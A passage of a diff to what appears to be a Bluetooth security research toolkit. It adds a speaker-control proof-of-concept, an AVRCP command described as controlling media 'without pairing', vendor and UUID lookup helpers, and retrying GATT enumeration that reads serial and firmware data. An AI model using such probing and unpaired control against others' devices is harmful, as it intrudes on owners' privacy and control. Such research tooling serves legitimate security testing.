@@ -726,6 +726,66 @@ def parse_args():
         help="Connection timeout in seconds (default: 30)"
     )
 
+    # BLE Speaker Control PoC
+    ble_speaker_parser = subparsers.add_parser(
+        "ble-speaker",
+        help="Bluetooth speaker control PoC - probe and control audio devices via BLE"
+    )
+    ble_speaker_parser.add_argument(
+        "--action",
+        choices=["probe", "play", "pause", "next", "prev",
+                 "vol-up", "vol-down", "mute", "read-all", "write-test"],
+        default="probe",
+        help="Action: probe (discover controls), play, pause, next, prev, vol-up, vol-down, mute, read-all (read all characteristics), write-test (probe writable chars)"
+    )
+    ble_speaker_parser.add_argument(
+        "--char-uuid",
+        type=str,
+        help="Specific characteristic UUID to interact with"
+    )
+    ble_speaker_parser.add_argument(
+        "--write-data",
+        type=str,
+        help="Hex data to write (e.g., '01020304' or 'play' for common commands)"
+    )
+    ble_speaker_parser.add_argument(
+        "--timeout",
+        type=float,
+        default=30.0,
+        help="Connection timeout in seconds (default: 30)"
+    )
+
+    # AVRCP Classic Bluetooth Media Control
+    avrcp_parser = subparsers.add_parser(
+        "avrcp",
+        help="AVRCP media control via Classic Bluetooth - play, pause, volume control without pairing"
+    )
+    avrcp_parser.add_argument(
+        "--action",
+        choices=["info", "play", "pause", "stop", "next", "prev",
+                 "vol-up", "vol-down", "mute", "ff", "rewind"],
+        default="info",
+        help="Action: info (show device info), play, pause, stop, next, prev, vol-up, vol-down, mute, ff (fast-forward), rewind"
+    )
+    avrcp_parser.add_argument(
+        "--repeat",
+        type=int,
+        default=1,
+        help="Number of times to repeat the action (default: 1)"
+    )
+    avrcp_parser.add_argument(
+        "--hold-time",
+        type=float,
+        default=0.1,
+        help="Time to hold button in seconds (default: 0.1)"
+    )
+    avrcp_parser.add_argument(
+        "--timeout",
+        type=float,
+        default=30.0,
+        help="Connection timeout in seconds (default: 30)"
+    )
+
     return parser.parse_args()
 
 
@@ -2167,6 +2227,380 @@ async def command_sniff(args: argparse.Namespace):
     return None
 
 
+# =============================================================================
+# BLE CHARACTERISTIC RESEARCH UTILITIES
+# =============================================================================
+
+async def lookup_oui_vendor(mac_address: str) -> dict:
+    """Look up the vendor/manufacturer from a MAC address OUI.
+
+    Args:
+        mac_address: MAC address in format XX:XX:XX:XX:XX:XX
+
+    Returns:
+        Dictionary with vendor information
+    """
+    import urllib.request
+    import urllib.error
+    import json
+
+    # Clean the MAC address and extract OUI
+    mac_clean = mac_address.replace(
+        "/P", "").replace(":", "").replace("-", "").upper()
+    oui = mac_clean[:6]
+
+    result = {
+        "oui": f"{oui[:2]}:{oui[2:4]}:{oui[4:6]}",
+        "vendor": None,
+        "address": None,
+        "source": None
+    }
+
+    # Try macvendors.com API (simple and free)
+    try:
+        url = f"https://api.macvendors.com/{oui}"
+        req = urllib.request.Request(
+            url, headers={"User-Agent": "RACE-Toolkit/1.0"})
+        with urllib.request.urlopen(req, timeout=5) as response:
+            vendor = response.read().decode('utf-8').strip()
+            if vendor and "Not Found" not in vendor:
+                result["vendor"] = vendor
+                result["source"] = "macvendors.com"
+                return result
+    except Exception:
+        pass
+
+    # Try maclookup.app API as fallback
+    try:
+        url = f"https://api.maclookup.app/v2/macs/{oui}"
+        req = urllib.request.Request(
+            url, headers={"User-Agent": "RACE-Toolkit/1.0"})
+        with urllib.request.urlopen(req, timeout=5) as response:
+            data = json.loads(response.read().decode('utf-8'))
+            if data.get("success") and data.get("found"):
+                result["vendor"] = data.get("company")
+                result["address"] = data.get("address")
+                result["source"] = "maclookup.app"
+                return result
+    except Exception:
+        pass
+
+    return result
+
+
+async def search_uuid_github(uuid: str) -> list:
+    """Search GitHub for information about a UUID.
+
+    Args:
+        uuid: The 128-bit UUID to search for
+
+    Returns:
+        List of dictionaries with search results
+    """
+    import urllib.request
+    import urllib.error
+    import urllib.parse
+    import json
+
+    results = []
+
+    # Search GitHub code (note: requires no auth for basic search)
+    try:
+        # URL-encode the UUID
+        encoded_uuid = urllib.parse.quote(f'"{uuid}"')
+        url = f"https://api.github.com/search/code?q={encoded_uuid}&per_page=5"
+        req = urllib.request.Request(url, headers={
+            "User-Agent": "RACE-Toolkit/1.0",
+            "Accept": "application/vnd.github.v3+json"
+        })
+        with urllib.request.urlopen(req, timeout=10) as response:
+            data = json.loads(response.read().decode('utf-8'))
+            if data.get("total_count", 0) > 0:
+                for item in data.get("items", [])[:3]:
+                    results.append({
+                        "repo": item.get("repository", {}).get("full_name"),
+                        "path": item.get("path"),
+                        "url": item.get("html_url"),
+                        "source": "GitHub"
+                    })
+    except Exception:
+        pass
+
+    return results
+
+
+async def search_nordic_database(uuid: str) -> dict:
+    """Search the Nordic Semiconductor Bluetooth Numbers Database.
+
+    Args:
+        uuid: The UUID to search for (short or long format)
+
+    Returns:
+        Dictionary with characteristic info if found
+    """
+    import urllib.request
+    import json
+
+    # Nordic maintains a public JSON database
+    try:
+        # Try the characteristics database
+        url = "https://raw.githubusercontent.com/NordicSemiconductor/bluetooth-numbers-database/master/v1/characteristic_uuids.json"
+        req = urllib.request.Request(
+            url, headers={"User-Agent": "RACE-Toolkit/1.0"})
+        with urllib.request.urlopen(req, timeout=10) as response:
+            data = json.loads(response.read().decode('utf-8'))
+            uuid_lower = uuid.lower()
+            for entry in data:
+                if entry.get("uuid", "").lower() == uuid_lower:
+                    return {
+                        "name": entry.get("name"),
+                        "identifier": entry.get("identifier"),
+                        "source": "Nordic Bluetooth Numbers Database"
+                    }
+    except Exception:
+        pass
+
+    return {}
+
+
+async def analyze_uuid_patterns(uuids: list) -> dict:
+    """Analyze a list of UUIDs to identify vendor patterns.
+
+    Args:
+        uuids: List of 128-bit UUID strings
+
+    Returns:
+        Dictionary with pattern analysis
+    """
+    analysis = {
+        "total_uuids": len(uuids),
+        "uuid_versions": {},
+        "base_patterns": {},
+        "likely_vendor": None,
+        "common_base": None
+    }
+
+    # Known vendor base patterns (last 96 bits / 24 hex chars)
+    KNOWN_BASES = {
+        "0000-1000-8000-00805f9b34fb": "Bluetooth SIG (Standard)",
+        "ba5e-f4ee-5ca1-eb1e5e4b1ce0": "Nordic Semiconductor (Legacy)",
+        "451a-8ffc-0000-10008000002a": "Qualcomm",
+        "5ca1-eb1e-5e4b-1ce000000000": "Nordic Semiconductor",
+        "7700-8000-b042-88a1cd000000": "Texas Instruments",
+    }
+
+    for uuid in uuids:
+        uuid = uuid.lower()
+
+        # Skip short-format UUIDs (e.g., "uuid-16:2a28") - only analyze 128-bit UUIDs
+        if not uuid or len(uuid) < 36 or "uuid-16" in uuid:
+            continue
+
+        # Determine UUID version from version nibble (position 14-15)
+        # Format: xxxxxxxx-xxxx-Vxxx-xxxx-xxxxxxxxxxxx where V is version
+        try:
+            if len(uuid) >= 15 and uuid[14].isalnum():
+                version_char = uuid[14]
+                version = int(version_char, 16)
+                version_name = {
+                    1: "v1 (Time-based)",
+                    2: "v2 (DCE Security)",
+                    3: "v3 (MD5 Hash)",
+                    4: "v4 (Random)",
+                    5: "v5 (SHA-1 Hash)"
+                }.get(version, f"v{version}")
+                analysis["uuid_versions"][version_name] = analysis["uuid_versions"].get(
+                    version_name, 0) + 1
+        except (ValueError, IndexError):
+            pass  # Skip if version parsing fails
+
+        # Extract base pattern (last 24 chars - excludes the unique identifier portion)
+        if len(uuid) >= 24:
+            base = uuid[-24:]
+            if base not in analysis["base_patterns"]:
+                analysis["base_patterns"][base] = []
+            analysis["base_patterns"][base].append(uuid)
+
+    # Find most common base
+    if analysis["base_patterns"]:
+        most_common_base = max(analysis["base_patterns"].keys(),
+                               key=lambda k: len(analysis["base_patterns"][k]))
+        analysis["common_base"] = most_common_base
+        analysis["common_base_count"] = len(
+            analysis["base_patterns"][most_common_base])
+
+        # Check against known vendor bases
+        for known_base, vendor in KNOWN_BASES.items():
+            if known_base in most_common_base or most_common_base in known_base:
+                analysis["likely_vendor"] = vendor
+                break
+
+    return analysis
+
+
+async def research_unknown_characteristics(unknown_chars: list, mac_address: str) -> dict:
+    """Perform automated research on unknown characteristics.
+
+    Args:
+        unknown_chars: List of tuples (uuid, properties, service_name)
+        mac_address: Device MAC address for OUI lookup
+
+    Returns:
+        Dictionary with all research results
+    """
+    import urllib.parse
+
+    research = {
+        "oui_lookup": None,
+        "pattern_analysis": None,
+        "uuid_findings": {},
+        "github_results": {},
+        "nordic_results": {}
+    }
+
+    # Lookup OUI vendor
+    print(
+        f"\n  \033[1;36m⟳ Looking up device manufacturer from MAC OUI...\033[0m")
+    research["oui_lookup"] = await lookup_oui_vendor(mac_address)
+
+    # Analyze UUID patterns
+    print(f"  \033[1;36m⟳ Analyzing UUID patterns...\033[0m")
+    uuids = [uuid for uuid, _, _ in unknown_chars]
+    research["pattern_analysis"] = await analyze_uuid_patterns(uuids)
+
+    # Search Nordic database for each UUID (rate limited)
+    print(f"  \033[1;36m⟳ Searching Nordic Bluetooth Numbers Database...\033[0m")
+    for uuid, props, svc in unknown_chars[:10]:  # Limit to first 10
+        result = await search_nordic_database(uuid)
+        if result:
+            research["nordic_results"][uuid] = result
+
+    # Search GitHub for first 3 unique base patterns (to avoid rate limits)
+    print(f"  \033[1;36m⟳ Searching GitHub for UUID references...\033[0m")
+    searched_bases = set()
+    for uuid, props, svc in unknown_chars:
+        if len(searched_bases) >= 3:
+            break
+        base = uuid[-24:] if len(uuid) >= 24 else uuid
+        if base not in searched_bases:
+            searched_bases.add(base)
+            # Search for the full UUID
+            results = await search_uuid_github(uuid)
+            if results:
+                research["github_results"][uuid] = results
+            await asyncio.sleep(0.5)  # Rate limit
+
+    return research
+
+
+def print_research_results(research: dict, unknown_chars: list, term_width: int):
+    """Print formatted research results.
+
+    Args:
+        research: Dictionary from research_unknown_characteristics()
+        unknown_chars: Original list of unknown characteristics
+        term_width: Terminal width for formatting
+    """
+
+    def print_header(title):
+        print(f"\n\033[1;36m{'─' * term_width}\033[0m")
+        print(f"\033[1;36m  {title}\033[0m")
+        print(f"\033[1;36m{'─' * term_width}\033[0m")
+
+    print_header("AUTOMATED RESEARCH RESULTS")
+
+    # OUI Lookup Results
+    oui = research.get("oui_lookup", {})
+    print(f"\n  \033[1;33m📍 DEVICE MANUFACTURER (OUI Lookup)\033[0m")
+    if oui.get("vendor"):
+        print(f"     MAC OUI: \033[1;36m{oui.get('oui')}\033[0m")
+        print(f"     Vendor: \033[1;32m{oui.get('vendor')}\033[0m")
+        if oui.get("address"):
+            print(f"     Address: {oui.get('address')}")
+        print(f"     Source: {oui.get('source')}")
+    else:
+        print(f"     MAC OUI: \033[1;36m{oui.get('oui')}\033[0m")
+        print(
+            f"     \033[0;90mVendor not found in public databases (may be randomized MAC)\033[0m")
+
+    # Pattern Analysis
+    analysis = research.get("pattern_analysis", {})
+    print(f"\n  \033[1;33m🔍 UUID PATTERN ANALYSIS\033[0m")
+
+    if analysis.get("uuid_versions"):
+        versions = ", ".join(
+            f"{k}: {v}" for k, v in analysis["uuid_versions"].items())
+        print(f"     UUID Versions: {versions}")
+
+    base_patterns = analysis.get("base_patterns", {})
+    print(f"     Unique Base Patterns: {len(base_patterns)}")
+
+    if analysis.get("likely_vendor"):
+        print(
+            f"     \033[1;32mIdentified Vendor: {analysis['likely_vendor']}\033[0m")
+    elif analysis.get("common_base"):
+        print(f"     Common Base: {analysis['common_base']}")
+        print(
+            f"     Characteristics with this base: {analysis.get('common_base_count', 0)}")
+        print(
+            f"     \033[0;90m→ Search this pattern to identify the vendor SDK\033[0m")
+
+    if len(base_patterns) == 1:
+        print(
+            f"     \033[1;32m✓ All UUIDs share the same base - likely from a single vendor SDK\033[0m")
+    elif len(base_patterns) > 1:
+        print(
+            f"     \033[0;33m⚠ Multiple base patterns - device may use multiple vendor libraries\033[0m")
+
+    # Nordic Database Results
+    nordic = research.get("nordic_results", {})
+    if nordic:
+        print(f"\n  \033[1;33m📚 NORDIC DATABASE MATCHES\033[0m")
+        for uuid, info in nordic.items():
+            print(f"     \033[1;32m{info.get('name', 'Unknown')}\033[0m")
+            print(f"       UUID: {uuid}")
+            print(f"       ID: {info.get('identifier', 'N/A')}")
+
+    # GitHub Results
+    github = research.get("github_results", {})
+    if github:
+        print(f"\n  \033[1;33m🔗 GITHUB CODE REFERENCES\033[0m")
+        for uuid, results in github.items():
+            print(f"     UUID: {uuid[:8]}...{uuid[-4:]}")
+            for r in results[:2]:
+                print(f"       → \033[0;36m{r.get('repo')}\033[0m")
+                print(f"         {r.get('path')}")
+    else:
+        print(f"\n  \033[1;33m🔗 GITHUB CODE REFERENCES\033[0m")
+        print(
+            f"     \033[0;90mNo public code references found (may need authenticated search)\033[0m")
+
+    # Recommended next steps
+    print(f"\n  \033[1;33m📋 RECOMMENDED NEXT STEPS\033[0m")
+
+    vendor = oui.get("vendor") or analysis.get("likely_vendor")
+    if vendor:
+        print(
+            f"     1. Search for \"{vendor} BLE SDK\" or \"{vendor} Bluetooth documentation\"")
+        print(
+            f"     2. Look for {vendor} developer portal or GitHub repositories")
+    else:
+        print(f"     1. Device may use a randomized MAC - check Device Information Service for vendor")
+
+    # Show the UUIDs formatted for searching
+    print(
+        f"\n     \033[0;90mSearch these UUIDs in Google (copy with quotes):\033[0m")
+    for uuid, props, svc in unknown_chars:
+        print(f"       \"{uuid}\"")
+
+    # FCC lookup suggestion if we found a vendor
+    if vendor:
+        vendor_search = vendor.replace(" ", "+").replace(",", "")
+        print(
+            f"\n     \033[0;90mFCC Database (may have protocol details):\033[0m")
+        print(f"       https://fccid.io/search?q={vendor_search}")
+
+
 async def command_ble_info(args: argparse.Namespace):
     """Enumerate BLE device information by connecting and reading GATT services.
 
@@ -2410,6 +2844,8 @@ async def command_ble_info(args: argparse.Namespace):
     device = None
     connection = None
     t = None
+    peer = None
+    max_retries = 3
 
     try:
         t = await open_transport_or_link(controller)
@@ -2420,50 +2856,76 @@ async def command_ble_info(args: argparse.Namespace):
         device = Device.from_config_with_hci(config, t.source, t.sink)
         await device.power_on()
 
-        # Connect to target
-        print(f"  \033[1;33mConnecting to {target_address}...\033[0m")
         target = Address(target_address)
 
-        try:
-            connection = await asyncio.wait_for(
-                device.connect(target),
-                timeout=timeout
-            )
-        except asyncio.TimeoutError:
-            print(
-                f"\n  \033[1;31mConnection timed out after {timeout}s\033[0m")
-            return
-        except Exception as e:
-            print(f"\n  \033[1;31mConnection failed: {e}\033[0m")
-            return
+        # Retry loop for connection and discovery
+        for attempt in range(1, max_retries + 1):
+            # Connect to target
+            if attempt > 1:
+                print(f"\n  \033[1;33mRetry {attempt}/{max_retries}...\033[0m")
+                await asyncio.sleep(1.0)  # Brief pause before retry
 
-        print(f"  \033[1;32mConnected!\033[0m")
-        print(f"  Connection Handle: 0x{connection.handle:04X}")
+            print(f"  \033[1;33mConnecting to {target_address}...\033[0m")
 
-        # Create peer for GATT operations
-        peer = Peer(connection)
-
-        print(f"\n  \033[1;33mDiscovering GATT services...\033[0m")
-        try:
-            await asyncio.wait_for(peer.discover_services(), timeout=10.0)
-            await asyncio.wait_for(peer.discover_characteristics(), timeout=10.0)
-        except asyncio.TimeoutError:
-            print(f"  \033[1;31mService discovery timed out\033[0m")
             try:
-                await connection.disconnect()
-            except Exception:
-                pass
-            return
-        except asyncio.CancelledError:
-            print(
-                f"  \033[1;31mConnection lost during service discovery\033[0m")
-            return
-        except Exception as e:
-            print(f"  \033[1;31mService discovery failed: {e}\033[0m")
+                connection = await asyncio.wait_for(
+                    device.connect(target),
+                    timeout=timeout
+                )
+            except asyncio.TimeoutError:
+                print(
+                    f"  \033[1;31mConnection timed out after {timeout}s\033[0m")
+                if attempt == max_retries:
+                    return
+                continue
+            except Exception as e:
+                print(f"  \033[1;31mConnection failed: {e}\033[0m")
+                if attempt == max_retries:
+                    return
+                continue
+
+            print(f"  \033[1;32mConnected!\033[0m")
+            print(f"  Connection Handle: 0x{connection.handle:04X}")
+
+            # Create peer for GATT operations
+            peer = Peer(connection)
+
+            print(f"\n  \033[1;33mDiscovering GATT services...\033[0m")
             try:
-                await connection.disconnect()
-            except Exception:
-                pass
+                await asyncio.wait_for(peer.discover_services(), timeout=15.0)
+                await asyncio.wait_for(peer.discover_characteristics(), timeout=15.0)
+                # Success - break out of retry loop
+                break
+            except asyncio.TimeoutError:
+                print(f"  \033[1;31mService discovery timed out\033[0m")
+                try:
+                    await connection.disconnect()
+                except Exception:
+                    pass
+                connection = None
+                peer = None
+                if attempt == max_retries:
+                    return
+                continue
+            except (asyncio.CancelledError, Exception) as e:
+                err_msg = "Connection lost" if isinstance(
+                    e, asyncio.CancelledError) else str(e)
+                print(
+                    f"  \033[1;31mService discovery failed: {err_msg}\033[0m")
+                try:
+                    if connection:
+                        await connection.disconnect()
+                except Exception:
+                    pass
+                connection = None
+                peer = None
+                if attempt == max_retries:
+                    return
+                continue
+
+        if not peer or not connection:
+            print(
+                f"  \033[1;31mFailed to connect after {max_retries} attempts\033[0m")
             return
 
         # Collect device info
@@ -2490,18 +2952,27 @@ async def command_ble_info(args: argparse.Namespace):
             services_found.append(
                 (service_uuid, service_name, service_icon, service))
 
+            # Helper to check if UUID matches (handles both full and short format)
+            def uuid_matches(char_uuid, short_id):
+                """Check if characteristic UUID matches a short ID like '2a00'."""
+                full_uuid = f"0000{short_id}-0000-1000-8000-00805f9b34fb"
+                short_format = f"uuid-16:{short_id}"
+                return char_uuid == full_uuid or char_uuid == short_format or short_id in char_uuid
+
             # Try to read characteristics
             for char in service.characteristics:
                 try:
-                    # Generic Access - Device Name
-                    if char.uuid == GATT_DEVICE_NAME_CHARACTERISTIC:
+                    char_uuid_str = str(char.uuid).lower()
+
+                    # Generic Access - Device Name (0x2A00)
+                    if char.uuid == GATT_DEVICE_NAME_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a00"):
                         value = await peer.read_value(char)
                         if value:
                             device_info["name"] = value.decode(
-                                'utf-8', errors='replace')
+                                'utf-8', errors='replace').strip('\x00')
 
-                    # Generic Access - Appearance
-                    elif char.uuid == GATT_APPEARANCE_CHARACTERISTIC:
+                    # Generic Access - Appearance (0x2A01)
+                    elif char.uuid == GATT_APPEARANCE_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a01"):
                         value = await peer.read_value(char)
                         if value and len(value) >= 2:
                             appearance = struct.unpack('<H', value[:2])[0]
@@ -2511,72 +2982,199 @@ async def command_ble_info(args: argparse.Namespace):
                             )
 
                     # Device Information Service characteristics
-                    elif char.uuid == GATT_MANUFACTURER_NAME_STRING_CHARACTERISTIC:
+                    elif char.uuid == GATT_MANUFACTURER_NAME_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a29"):
                         value = await peer.read_value(char)
                         if value:
                             device_info["manufacturer"] = value.decode(
-                                'utf-8', errors='replace')
+                                'utf-8', errors='replace').strip('\x00')
 
-                    elif char.uuid == GATT_MODEL_NUMBER_STRING_CHARACTERISTIC:
+                    elif char.uuid == GATT_MODEL_NUMBER_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a24"):
                         value = await peer.read_value(char)
                         if value:
                             device_info["model"] = value.decode(
-                                'utf-8', errors='replace')
+                                'utf-8', errors='replace').strip('\x00')
 
-                    elif char.uuid == GATT_SERIAL_NUMBER_STRING_CHARACTERISTIC:
+                    elif char.uuid == GATT_SERIAL_NUMBER_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a25"):
                         value = await peer.read_value(char)
                         if value:
                             device_info["serial"] = value.decode(
-                                'utf-8', errors='replace')
+                                'utf-8', errors='replace').strip('\x00')
 
-                    elif char.uuid == GATT_FIRMWARE_REVISION_STRING_CHARACTERISTIC:
+                    elif char.uuid == GATT_FIRMWARE_REVISION_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a26"):
                         value = await peer.read_value(char)
                         if value:
                             device_info["firmware"] = value.decode(
-                                'utf-8', errors='replace')
+                                'utf-8', errors='replace').strip('\x00')
 
-                    elif char.uuid == GATT_HARDWARE_REVISION_STRING_CHARACTERISTIC:
+                    elif char.uuid == GATT_HARDWARE_REVISION_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a27"):
                         value = await peer.read_value(char)
                         if value:
-                            device_info["hardware"] = value.decode(
-                                'utf-8', errors='replace')
+                            # Try to decode as UTF-8 string first
+                            decoded = value.decode(
+                                'utf-8', errors='replace').strip('\x00')
+                            if decoded and decoded.isprintable():
+                                device_info["hardware"] = decoded
+                            else:
+                                # Binary format - interpret as version bytes
+                                if len(value) >= 2:
+                                    version_parts = [str(b) for b in value]
+                                    device_info["hardware"] = '.'.join(
+                                        version_parts)
+                                elif len(value) == 1:
+                                    device_info["hardware"] = f"Rev {value[0]}"
+                                else:
+                                    device_info["hardware"] = value.hex()
+                            logging.debug(
+                                f"Read hardware revision: {value.hex()} -> '{device_info['hardware']}'")
 
-                    elif char.uuid == GATT_SOFTWARE_REVISION_STRING_CHARACTERISTIC:
-                        value = await peer.read_value(char)
-                        if value:
-                            device_info["software"] = value.decode(
-                                'utf-8', errors='replace')
+                    elif char.uuid == GATT_SOFTWARE_REVISION_STRING_CHARACTERISTIC or uuid_matches(char_uuid_str, "2a28"):
+                        logging.debug(
+                            f"Found software revision characteristic: {char.uuid}")
+                        try:
+                            value = await peer.read_value(char)
+                            logging.debug(
+                                f"Software revision raw value: {value.hex() if value else 'None'}")
+                            if value:
+                                # Try to decode as UTF-8 string first
+                                decoded = value.decode(
+                                    'utf-8', errors='replace').strip('\x00')
+                                if decoded and decoded.isprintable():
+                                    device_info["software"] = decoded
+                                else:
+                                    # Binary format - interpret as version bytes
+                                    if len(value) >= 2:
+                                        # Common format: major.minor or major.minor.patch.build
+                                        version_parts = [str(b) for b in value]
+                                        device_info["software"] = '.'.join(
+                                            version_parts)
+                                    else:
+                                        device_info["software"] = value.hex()
+                                logging.debug(
+                                    f"Read software revision: {value.hex()} -> '{device_info['software']}'")
+                            else:
+                                device_info["software"] = None
+                        except Exception as read_err:
+                            logging.debug(
+                                f"Failed to read software revision: {read_err}")
 
                     # Battery Level (0x2A19)
-                    elif str(char.uuid).lower() == "00002a19-0000-1000-8000-00805f9b34fb":
+                    elif uuid_matches(char_uuid_str, "2a19"):
                         value = await peer.read_value(char)
                         if value:
                             device_info["battery"] = value[0]
 
-                except Exception:
-                    pass  # Some characteristics may not be readable
+                    # Battery Power State (0x2A1A)
+                    elif uuid_matches(char_uuid_str, "2a1a"):
+                        value = await peer.read_value(char)
+                        if value:
+                            device_info["battery_state"] = value[0]
 
-        # Print Device Information
-        print_header("DEVICE INFORMATION")
-        print_field("Address", target_address)
-        print_field("Name", device_info["name"])
-        print_field(
-            "Appearance", f"{device_info['appearance_name']} ({device_info['appearance']})" if device_info["appearance"] else None)
-        print_field("Manufacturer", device_info["manufacturer"])
-        print_field("Model", device_info["model"])
-        print_field("Serial Number", device_info["serial"])
-        print_field("Firmware Rev", device_info["firmware"])
-        print_field("Hardware Rev", device_info["hardware"])
-        print_field("Software Rev", device_info["software"])
-        if device_info["battery"] is not None:
-            battery_bar = "█" * \
-                (device_info["battery"] // 10) + "░" * \
-                (10 - device_info["battery"] // 10)
-            print_field(
-                "Battery", f"{device_info['battery']}% [{battery_bar}]")
+                except Exception as e:
+                    logging.debug(
+                        f"Failed to read characteristic {char.uuid}: {e}")
 
-        # Print Services
+        # Determine device type from multiple signals
+        device_types = []
+        device_name_lower = (device_info.get("name") or "").lower()
+        manufacturer_lower = (device_info.get("manufacturer") or "").lower()
+        appearance_name = (device_info.get("appearance_name") or "").lower()
+
+        # Check device name for keywords
+        audio_keywords = ["speaker", "headphone", "earphone", "earbud", "headset",
+                          "soundbar", "audio", "music", "sound", "bass", "subwoofer",
+                          "amp", "amplifier", "receiver", "stereo", "hifi", "hi-fi"]
+        watch_keywords = ["watch", "band",
+                          "tracker", "fit", "garmin", "fitbit"]
+        keyboard_keywords = ["keyboard", "keys", "keeb", "mechanical"]
+        mouse_keywords = ["mouse", "trackpad", "trackball", "pointing"]
+        phone_keywords = ["phone", "mobile",
+                          "iphone", "android", "pixel", "galaxy"]
+        tv_keywords = ["tv", "television", "roku",
+                       "firestick", "chromecast", "appletv"]
+
+        for keyword in audio_keywords:
+            if keyword in device_name_lower:
+                device_types.append("🔊 Bluetooth Speaker/Audio")
+                break
+
+        for keyword in watch_keywords:
+            if keyword in device_name_lower or keyword in appearance_name:
+                device_types.append("⌚ Smartwatch/Fitness Tracker")
+                break
+
+        for keyword in keyboard_keywords:
+            if keyword in device_name_lower:
+                device_types.append("⌨️ Keyboard")
+                break
+
+        for keyword in mouse_keywords:
+            if keyword in device_name_lower:
+                device_types.append("🖱️ Mouse/Pointing Device")
+                break
+
+        for keyword in phone_keywords:
+            if keyword in device_name_lower:
+                device_types.append("📱 Mobile Phone")
+                break
+
+        for keyword in tv_keywords:
+            if keyword in device_name_lower:
+                device_types.append("📺 TV/Streaming Device")
+                break
+
+        # Check manufacturer for hints
+        audio_manufacturers = ["logitech", "bose", "sony", "jbl", "harman", "beats",
+                               "sennheiser", "audio-technica", "skullcandy", "jabra",
+                               "anker", "soundcore", "marshall", "bang & olufsen", "b&o",
+                               "sonos", "ultimate ears", "ue", "creative", "edifier"]
+
+        for mfr in audio_manufacturers:
+            if mfr in manufacturer_lower or mfr in device_name_lower:
+                if "🔊 Bluetooth Speaker/Audio" not in device_types:
+                    device_types.append("🔊 Audio Device (by manufacturer)")
+                break
+
+        # Check services for device type hints
+        for service_uuid, service_name, service_icon, _ in services_found:
+            if "Audio" in service_name or "Handsfree" in service_name or "A2DP" in service_name:
+                if "🔊 Bluetooth Speaker/Audio" not in device_types and "🔊 Audio Device (by manufacturer)" not in device_types:
+                    device_types.append("🔊 Audio Device")
+            if "HID" in service_name:
+                if "🎮 Input Device (HID)" not in device_types:
+                    device_types.append("🎮 Input Device (HID)")
+            if "Heart Rate" in service_name:
+                device_types.append("❤️ Fitness/Health Device")
+            if "AirPods" in service_name or "apple" in service_name.lower():
+                device_types.append("🎧 Apple AirPods")
+
+        # Check appearance for device type
+        if "headphone" in appearance_name or "headset" in appearance_name:
+            if not any("Audio" in dt or "Speaker" in dt for dt in device_types):
+                device_types.append("🎧 Headphones/Headset")
+        if "speaker" in appearance_name:
+            if not any("Audio" in dt or "Speaker" in dt for dt in device_types):
+                device_types.append("🔊 Speaker")
+        if "keyboard" in appearance_name:
+            if "⌨️ Keyboard" not in device_types:
+                device_types.append("⌨️ Keyboard")
+        if "mouse" in appearance_name:
+            if "🖱️ Mouse/Pointing Device" not in device_types:
+                device_types.append("🖱️ Mouse")
+        if "watch" in appearance_name:
+            if not any("Watch" in dt or "Fitness" in dt for dt in device_types):
+                device_types.append("⌚ Watch")
+        if "phone" in appearance_name:
+            if "📱 Mobile Phone" not in device_types:
+                device_types.append("📱 Phone")
+
+        if not device_types:
+            device_types = ["❓ Generic BLE Device"]
+
+        # Print Services FIRST
         print_header(f"GATT SERVICES ({len(services_found)} found)")
+
+        # Track unknown characteristics for research guidance
+        unknown_characteristics = []
 
         for service_uuid, service_name, service_icon, service in services_found:
             # Show full UUID for standard services as 0xXXXX, or full 128-bit for custom
@@ -2613,49 +3211,124 @@ async def command_ble_info(args: argparse.Namespace):
                 # Look up characteristic name
                 char_name = None
                 char_desc = None
+                char_vendor = None
+                is_standard_char = False
+
+                # Check standard Bluetooth SIG characteristics
+                # Handle both full UUID format and Bumble's short format (uuid-16:XXXX)
                 if char_uuid.startswith("0000") and char_uuid.endswith("-0000-1000-8000-00805f9b34fb"):
+                    # Full 128-bit format: 0000XXXX-0000-1000-8000-00805f9b34fb
                     short_id = char_uuid[4:8]
                     if short_id in CHARACTERISTIC_NAMES:
                         char_name, char_desc = CHARACTERISTIC_NAMES[short_id]
                     display_char_uuid = f"0x{short_id.upper()}"
+                    is_standard_char = True
+                elif char_uuid.startswith("uuid-16:"):
+                    # Bumble short format: uuid-16:XXXX
+                    short_id = char_uuid.split(":")[1].lower()
+                    if short_id in CHARACTERISTIC_NAMES:
+                        char_name, char_desc = CHARACTERISTIC_NAMES[short_id]
+                    display_char_uuid = f"0x{short_id.upper()}"
+                    is_standard_char = True
                 else:
                     display_char_uuid = char_uuid
+                    # Check vendor-specific characteristics
+                    if char_uuid in VENDOR_CHARACTERISTICS:
+                        char_name, char_vendor, char_desc = VENDOR_CHARACTERISTICS[char_uuid]
 
-                if char_name:
+                if char_name and char_vendor:
+                    # Known vendor-specific characteristic
+                    print(f"       • \033[1;33m{char_name}\033[0m")
+                    print(f"         UUID: {display_char_uuid}")
+                    print(f"         Vendor: \033[1;35m{char_vendor}\033[0m")
+                    print(f"         \033[0;90m{char_desc}\033[0m")
+                    print(f"         Properties: [{', '.join(props)}]")
+                elif char_name:
+                    # Known standard characteristic
                     print(
                         f"       • \033[1;33m{char_name}\033[0m ({display_char_uuid})")
                     print(f"         \033[0;90m{char_desc}\033[0m")
                     print(f"         Properties: [{', '.join(props)}]")
+                elif is_standard_char:
+                    # Standard Bluetooth SIG characteristic but not in our lookup table
+                    print(
+                        f"       • \033[0;37m{display_char_uuid}\033[0m (Bluetooth SIG): [{', '.join(props)}]")
                 else:
+                    # Unknown vendor characteristic
                     print(
                         f"       • \033[0;37m{display_char_uuid}\033[0m: [{', '.join(props)}]")
-                    if not char_uuid.startswith("0000"):
-                        print(
-                            f"         \033[0;90mVendor-specific characteristic\033[0m")
+                    print(
+                        f"         \033[0;90m⚠ Unknown vendor characteristic\033[0m")
+                    unknown_characteristics.append(
+                        (char_uuid, props, service_name))
 
-        # Summary
-        print_header("SUMMARY")
+        # Show unknown characteristics count
+        if unknown_characteristics:
+            print(
+                f"\n  \033[0;33m⚠ Found {len(unknown_characteristics)} unknown vendor characteristic(s)\033[0m")
 
-        # Determine device type from services
-        device_types = []
-        for service_uuid, service_name, service_icon, _ in services_found:
